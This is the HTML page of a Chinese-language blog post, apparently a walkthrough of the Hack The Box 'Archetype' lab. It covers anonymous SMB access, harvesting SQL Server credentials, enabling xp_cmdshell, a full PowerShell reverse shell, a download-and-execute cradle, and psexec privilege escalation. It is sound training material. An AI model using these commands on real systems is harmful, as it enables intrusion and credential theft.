@@ -1,0 +1,362 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>HTB Starting Point | Atmet</title>
+<meta name=keywords content="Hack The Box">
+<meta name=description content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<meta name=author content="DaChui">
+<link rel=canonical href=https://oopsdc.tk/post/htb-starting-point/>
+<link href=/assets/css/stylesheet.min.fe37c241822b208b1ade5508f8fdbbe116fdf98dae7ffe71501145355d4636b4.css integrity="sha256-/jfCQYIrIIsa3lUI+P274Rb9+Y2uf/5xUBFFNV1GNrQ=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<meta property="og:title" content="HTB Starting Point">
+<meta property="og:description" content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://oopsdc.tk/post/htb-starting-point/"><meta property="og:image" content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2021-09-12T15:54:16+08:00">
+<meta property="article:modified_time" content="2021-09-12T15:54:16+08:00"><meta property="og:site_name" content="Atmet">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="HTB Starting Point">
+<meta name=twitter:description content="Archetype  目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27
+ 1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.tk/post/"},{"@type":"ListItem","position":2,"name":"HTB Starting Point","item":"https://oopsdc.tk/post/htb-starting-point/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Starting Point","name":"HTB Starting Point","description":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：","keywords":["Hack The Box"],"articleBody":"Archetype  目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27\n 1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：\nsmbclient -N -L //10.10.10.27/ # 参数讲解 N：匿名登录 L：获取共享资源列表 # 结果 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available 获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的$代表为隐藏文件夹，接下来我们匿名登录看一下backups文件夹的内容：\nsmbclient -N //10.10.10.27/backups # 列出当前目录下的文件 smb: \\ dir . D 0 Mon Jan 20 20:20:57 2020 .. D 0 Mon Jan 20 20:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 10328063 blocks of size 4096. 8260548 blocks available # 下载prod.dtsConfig文件 smb: \\ get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec) 下载的文件会默认存储在当前目录，查看prod.dtsConfig文件：\nvim prod.dtsConfig   =\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/  =\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\" Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;   这个文件包含了一些数据库连接参数的配置，我们得到帐密ARCHETYPE\\sql_svc，M3g4c0rp123。\nSQL Server有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，ARCHETYPE代表主机名，sql_svc代表具有数据库登录权限的操作系统用户名，M3g4c0rp123就是密码。\n2、拿Shell 根据nmap扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。\n需要的工具：SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)\n这是一个用Python编写的后工具集，本次渗透要用到其中的mssqlclient.py，安装过程不再赘述。\n使用操作系统身份验证登录数据库：\npython3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth # 输入密码后登录成功 # 数据库身份认证启用了TLS [*] Encryption required, switching to TLS # 当前数据库为master [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands 登录成功后使用SQL Server的IS_SRVROLEMEMBER('sysadmin')判断当前数据库用户是否具有sysadmin权限：\nSELECT IS_SRVROLEMEMBER('sysadmin') # 结果 -----------  1 返回结果为1，代表当前数据库用户具有sysadmin权限，可进一步尝试使用xp_cmdshell实现RCE：\n# sp_configure修改数据库配置的存储过程，当show advanced options参数为1时，才能够修改数据库配置中的某些高级选项，其中就有xp_cmdshell，因此需要先设置show advanced options参数 EXEC sp_configure 'show advanced options', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用sp_configure存储过程更改的配置选项 reconfigure # 使用sp_configure存储过程启用xp_cmdshell参数，此参数启用后允许SQL Server调用操作系统命令 EXEC sp_configure 'xp_cmdshell', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. # 提交上一步使用 sp_configure存储过程更改的配置选项 reconfigure # 以上命令也可使用mssqlclient的shell命令一步实现 enable_xp_cmdshell [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. 查看当前身份：\nxp_cmdshell \"whoami\" # 结果 output --------------------------------------------------------------------------------  archetype\\sql_svc NULL 查看是否存在开发环境：\nxp_cmdshell \"python\" # 结果 output --------------------------------------------------------------------------------  'python' is not recognized as an internal or external command, operable program or batch file. NULL 3、获取用户权限 根据之前nmap的扫描结果，靶机应该为Windows Server 2008 R2，可以考虑从powershell入手，建立一个powershell的反向shell文件1.ps1：\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.62\",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u00261 | Out-String ); $sendback2 = $sendback + \"# \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() 保存完文件后，不要切换目录，在当前目录起一个HTTP服务器：\npython3 -m http.server 80 开启本地监听：\nnc -lvvp 443 在数据库中执行命令下载并执行脚本：\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.62/1.ps1\\\");\" 下载成功后可以看到Web服务器和nc都有对应的连接信息，切换到nc窗口，回车发现拿到了靶机的shell交互：\n# 查看当前用户身份 whoami # 结果 archetype\\sql_svc # 查看当前路径 pwd # 结果 Path ---- C:\\Windows\\system32 # 查看桌面文件 dir C:\\Users\\sql_svc\\Desktop Directory: C:\\Users\\sql_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/25/2020 6:37 AM 32 user.txt # 查看user.txt type C:\\Users\\sql_svc\\Desktop\\user.txt 4、提权 查看powershell历史记录：\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # 结果 net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit 发现administrator将文件夹\\Archetype\\backups映射到T盘，MEGACORP_4dm1n!!为密码。\n尝试使用impakcet中的psexec.py提权：\npython3 psexec.py administrator@10.10.10.27 # 连接信息 [*] Requesting shares on 10.10.10.27..... [*] Found writable share ADMIN$ [*] Uploading file TPMzHnhC.exe [*] Opening SVCManager on 10.10.10.27..... [*] Creating service yQAe on 10.10.10.27..... [*] Starting service yQAe..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. # 查看当前身份 C:\\Windows\\system32whoami nt authority\\system # 查看桌面目录 dir C:\\Users\\Administrator\\Desktop # 结果 Directory of C:\\Users\\Administrator\\Desktop 01/20/2020 06:42 AM  . 01/20/2020 06:42 AM  .. 02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 33,833,361,408 bytes free # 查看root.txt type C:\\Users\\Administrator\\Desktop\\root.txt  本文链接：[HTB-Starting Point | Atmet (oopsdc.tk)](https://oopsdc.tk/post/HTB-Starting Point/)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"664","inLanguage":"en","datePublished":"2021-09-12T15:54:16+08:00","dateModified":"2021-09-12T15:54:16+08:00","author":{"@type":"Person","name":"DaChui"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.tk/post/htb-starting-point/"},"publisher":{"@type":"Organization","name":"Atmet","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<noscript>
+<style type=text/css>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://oopsdc.tk/ accesskey=h title="Home (Alt + H)">Home</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu onscroll=menu_on_scroll()>
+<li>
+<a href=https://oopsdc.tk/archives/ title=Archives>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href=https://oopsdc.tk/links/ title=Links>
+<span>Links</span>
+</a>
+</li>
+<li>
+<a href=https://oopsdc.tk/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+<li>
+<a href=https://oopsdc.tk/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li></ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs>
+<a href=https://oopsdc.tk/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.tk/post/>Posts</a>
+</div>
+<h1 class=post-title>
+HTB Starting Point
+</h1>
+<div class=post-meta>
+September 12, 2021&nbsp;·&nbsp;4 min&nbsp;·&nbsp;DaChui
+</div>
+</header>
+<div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<div class=details>Table of Contents</div>
+</summary>
+<div class=inner><ul><li>
+<a href=#archetype aria-label=Archetype>Archetype</a><ul>
+<li>
+<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=1、信息收集>1、信息收集</a></li><li>
+<a href=#2%e6%8b%bfshell aria-label=2、拿Shell>2、拿Shell</a></li><li>
+<a href=#3%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=3、获取用户权限>3、获取用户权限</a></li><li>
+<a href=#4%e6%8f%90%e6%9d%83 aria-label=4、提权>4、提权</a></li></ul>
+</li></ul>
+</div>
+</details>
+</div>
+<div class=post-content>
+<h1 id=archetype>Archetype<a hidden class=anchor aria-hidden=true href=#archetype>#</a></h1>
+<blockquote>
+<p>目标：拿到用户权限与系统权限。</p>
+<p>靶机IP：10.10.10.27</p>
+</blockquote>
+<h2 id=1信息收集>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集>#</a></h2>
+<p>先使用<code>nmap</code>看看靶机开放了什么端口：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.27
+
+<span style=color:#75715e># 参数讲解</span>
+sS：使用SYN半开放式扫描，扫描快，隐蔽性高
+sV：探测服务版本
+
+<span style=color:#75715e># 扫描结果</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.27 <span style=color:#f92672>(</span>10.10.10.27<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>996</span> closed ports
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 - <span style=color:#ae81ff>2012</span> microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server <span style=color:#ae81ff>2017</span> 14.00.1000
+Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p>比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N -L //10.10.10.27/
+
+<span style=color:#75715e># 参数讲解</span>
+N：匿名登录
+L：获取共享资源列表
+
+<span style=color:#75715e># 结果</span>
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backups         Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+</code></pre></div><p>获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的<code>$</code>代表为隐藏文件夹，接下来我们匿名登录看一下<code>backups</code>文件夹的内容：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N //10.10.10.27/backups
+
+<span style=color:#75715e># 列出当前目录下的文件</span>
+smb: <span style=color:#ae81ff>\&gt;</span> dir
+  .                                   D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
+  ..                                  D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
+  prod.dtsConfig                     AR      <span style=color:#ae81ff>609</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:23:02 <span style=color:#ae81ff>2020</span>
+
+		<span style=color:#ae81ff>10328063</span> blocks of size 4096. <span style=color:#ae81ff>8260548</span> blocks available
+
+<span style=color:#75715e># 下载prod.dtsConfig文件</span>
+smb: <span style=color:#ae81ff>\&gt;</span> get prod.dtsConfig
+getting file <span style=color:#ae81ff>\p</span>rod.dtsConfig of size <span style=color:#ae81ff>609</span> as prod.dtsConfig <span style=color:#f92672>(</span>0.5 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 0.5 KiloBytes/sec<span style=color:#f92672>)</span>
+</code></pre></div><p>下载的文件会默认存储在当前目录，查看<code>prod.dtsConfig</code>文件：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vim prod.dtsConfig
+
+&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageName<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedDate<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;20.1.2019 10:01:34&#34;</span>/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Property&#34;</span> Path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;String&#34;</span>&gt;
+        &lt;ConfiguredValue&gt;Data Source<span style=color:#f92672>=</span>.;Password<span style=color:#f92672>=</span>M3g4c0rp123;User ID<span style=color:#f92672>=</span>ARCHETYPE<span style=color:#ae81ff>\s</span>ql_svc;Initial Catalog<span style=color:#f92672>=</span>Catalog;Provider<span style=color:#f92672>=</span>SQLNCLI10.1;Persist Security Info<span style=color:#f92672>=</span>True;Auto Translate<span style=color:#f92672>=</span>False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt; 
+</code></pre></div><p>这个文件包含了一些数据库连接参数的配置，我们得到帐密<code>ARCHETYPE\sql_svc，M3g4c0rp123</code>。</p>
+<p>SQL Server有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，ARCHETYPE代表主机名，sql_svc代表具有数据库登录权限的操作系统用户名，M3g4c0rp123就是密码。</p>
+<h2 id=2拿shell>2、拿Shell<a hidden class=anchor aria-hidden=true href=#2拿shell>#</a></h2>
+<p>根据nmap扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。</p>
+<p>需要的工具：<a href=https://github.com/SecureAuthCorp/impacket>SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)</a></p>
+<p>这是一个用Python编写的后工具集，本次渗透要用到其中的<code>mssqlclient.py</code>，安装过程不再赘述。</p>
+<p>使用操作系统身份验证登录数据库：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+
+<span style=color:#75715e># 输入密码后登录成功</span>
+<span style=color:#75715e># 数据库身份认证启用了TLS</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Encryption required, switching to TLS
+<span style=color:#75715e># 当前数据库为master</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>DATABASE<span style=color:#f92672>)</span>: Old Value: master, New Value: master
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>LANGUAGE<span style=color:#f92672>)</span>: Old Value: , New Value: us_english
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>PACKETSIZE<span style=color:#f92672>)</span>: Old Value: 4096, New Value: <span style=color:#ae81ff>16192</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed database context to <span style=color:#e6db74>&#39;master&#39;</span>.
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed language setting to us_english.
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ACK: Result: <span style=color:#ae81ff>1</span> - Microsoft SQL Server <span style=color:#f92672>(</span><span style=color:#ae81ff>140</span> 3232<span style=color:#f92672>)</span> 
+<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+</code></pre></div><p>登录成功后使用SQL Server的<code>IS_SRVROLEMEMBER('sysadmin')</code>判断当前数据库用户是否具有<code>sysadmin</code>权限：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>SELECT</span> IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>)
+              
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#75715e>-----------   
+</span><span style=color:#75715e></span>
+          <span style=color:#ae81ff>1</span> 
+</code></pre></div><p>返回结果为1，代表当前数据库用户具有<code>sysadmin</code>权限，可进一步尝试使用<code>xp_cmdshell</code>实现<code>RCE</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#f92672>#</span> sp_configure修改数据库配置的存储过程<span style=color:#960050;background-color:#1e0010>，当</span><span style=color:#66d9ef>show</span> advanced options参数为1时<span style=color:#960050;background-color:#1e0010>，才能够修改数据库配置中的某些高级选项，其中就有</span>xp_cmdshell<span style=color:#960050;background-color:#1e0010>，因此需要先设置</span><span style=color:#66d9ef>show</span> advanced options参数
+<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>, <span style=color:#ae81ff>1</span>
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span>sp_configure存储过程更改的配置选项
+reconfigure
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>使用</span>sp_configure存储过程启用xp_cmdshell参数<span style=color:#960050;background-color:#1e0010>，此参数启用后允许</span><span style=color:#66d9ef>SQL</span> Server调用操作系统命令
+<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, <span style=color:#ae81ff>1</span>
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span> sp_configure存储过程更改的配置选项
+reconfigure
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>以上命令也可使用</span>mssqlclient的shell命令一步实现
+enable_xp_cmdshell
